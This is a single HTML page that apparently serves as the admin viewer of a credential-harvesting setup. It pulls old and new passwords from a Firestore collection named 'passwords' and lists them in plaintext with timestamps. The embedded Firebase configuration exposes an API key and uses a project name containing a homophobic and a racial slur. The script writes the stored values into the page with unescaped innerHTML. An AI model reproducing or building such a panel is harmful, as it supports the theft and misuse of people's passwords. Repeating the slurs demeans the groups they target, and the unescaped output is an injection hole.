<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Admin Dashboard</title>
  <style>
    /* Global Styles */
    body {
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      margin: 0;
      padding: 0;
      background-color: #f4f7fc;
      color: #333;
    }

    .container {
      width: 90%;
      max-width: 1200px;
      margin: 40px auto;
      background-color: #fff;
      border-radius: 12px;
      box-shadow: 0 6px 18px rgba(0, 0, 0, 0.15);
      padding: 30px;
      position: relative;
      overflow: hidden;
    }

    h1 {
      font-size: 32px;
      margin-bottom: 20px;
      text-align: center;
      color: #333;
    }

    /* Sort Button */
    .sort-btn {
      padding: 8px 16px;
      background-color: #007bff;
      color: white;
      border: none;
      border-radius: 6px;
      cursor: pointer;
      position: absolute;
      right: 30px;
      top: 20px;
      box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
      transition: all 0.3s ease;
    }

    .sort-btn:hover {
      background-color: #0056b3;
    }

    /* Sort Popup */
    .sort-popup {
      display: none;
      position: fixed;
      top: 0;
      right: 0;
      width: 300px;
      height: 100%;
      background-color: #fff;
      box-shadow: -4px 0 10px rgba(0, 0, 0, 0.2);
      z-index: 1000;
      padding: 20px;
      overflow-y: auto;
    }

    .sort-popup.active {
      display: block;
    }

    .sort-popup h3 {
      margin-top: 0;
    }

    .sort-popup button {
      width: 100%;
      padding: 10px 15px;
      border: none;
      background-color: #007bff;
      color: white;
      margin-bottom: 10px;
      border-radius: 6px;
      cursor: pointer;
      transition: all 0.3s ease;
    }

    .sort-popup button:hover {
      background-color: #0056b3;
    }

    /* Table Styles */
    .table-wrapper {
      width: 100%;
      overflow-x: auto;
      margin-top: 40px;
    }

    table {
      width: 100%;
      border-collapse: collapse;
      font-size: 16px;
    }

    th, td {
      padding: 16px;
      text-align: left;
      border-bottom: 1px solid #ddd;
    }

    th {
      background-color: #007bff;
      color: white;
      font-weight: bold;
      border-radius: 8px;
    }

    td {
      background-color: #f9f9f9;
    }

    tr:nth-child(even) {
      background-color: #f1f1f1;
    }

    /* Responsive Design */
    @media screen and (max-width: 768px) {
      .container {
        padding: 15px;
      }

      table {
        font-size: 14px;
      }

      .sort-btn {
        font-size: 14px;
        padding: 6px 10px;
      }
    }
  </style>
</head>
<body>

  <div class="container">
    <h1>Admin Dashboard</h1>
    <button class="sort-btn" onclick="toggleSortPopup()">Sort By</button>

    <div class="sort-popup" id="sortPopup">
      <h3>Sort Passwords By:</h3>
      <button onclick="sortData('recent')">Recently Added</button>
      <button onclick="sortData('oldest')">Oldest</button>
    </div>

    <div class="table-wrapper">
      <table id="passwordTable">
        <thead>
          <tr>
            <th>Old Password</th>
            <th>New Password</th>
            <th>Timestamp</th>
          </tr>
        </thead>
        <tbody>
          <!-- Data will be inserted here dynamically -->
        </tbody>
      </table>
    </div>
  </div>

  <!-- Firebase Scripts -->
  <script type="module">
    import { initializeApp } from 'https://www.gstatic.com/firebasejs/9.17.1/firebase-app.js';
    import { getFirestore, collection, getDocs } from 'https://www.gstatic.com/firebasejs/9.17.1/firebase-firestore.js';

    // Firebase configuration
    const firebaseConfig = {
  apiKey: "AIzaSyBLqQhAtNuO632Xd3-e5Fe3oYDKLJGT8K0",
  authDomain: "gay-ass-nigga.firebaseapp.com",
  databaseURL: "https://gay-ass-nigga-default-rtdb.firebaseio.com",
  projectId: "gay-ass-nigga",
  storageBucket: "gay-ass-nigga.firebasestorage.app",
  messagingSenderId: "740449529935",
  appId: "1:740449529935:web:ab2538ff3bdad3fbc8fa3a"
};

    // Initialize Firebase
    const app = initializeApp(firebaseConfig);
    const db = getFirestore(app);

    let passwordData = [];

    // Load password data from Firebase Firestore
    async function loadPasswordData() {
      const querySnapshot = await getDocs(collection(db, "passwords"));
      const tableBody = document.querySelector("#passwordTable tbody");

      querySnapshot.forEach((doc) => {
        const data = doc.data();
        const timestamp = data.timestamp.toDate();
        passwordData.push({ ...data, timestamp });

        const row = document.createElement("tr");
        row.innerHTML = `
          <td>${data.oldPassword}</td>
          <td>${data.newPassword}</td>
          <td>${timestamp.toLocaleString()}</td>
        `;
        tableBody.appendChild(row);
      });
    }

    // Toggle sort popup visibility
    function toggleSortPopup() {
      document.getElementById('sortPopup').classList.toggle('active');
    }

    // Sort data function
    function sortData(criteria) {
      let sortedData = [];
      
      if (criteria === 'recent') {
        sortedData = passwordData.sort((a, b) => b.timestamp - a.timestamp);
      } else if (criteria === 'oldest') {
        sortedData = passwordData.sort((a, b) => a.timestamp - b.timestamp);
      }

      const tableBody = document.querySelector("#passwordTable tbody");
      tableBody.innerHTML = '';

      sortedData.forEach((data) => {
        const row = document.createElement("tr");
        row.innerHTML = `
          <td>${data.oldPassword}</td>
          <td>${data.newPassword}</td>
          <td>${data.timestamp.toLocaleString()}</td>
        `;
        tableBody.appendChild(row);
      });

      toggleSortPopup();
    }

    // Load data when page is ready
    window.onload = loadPasswordData;
  </script>
</body>
</html>
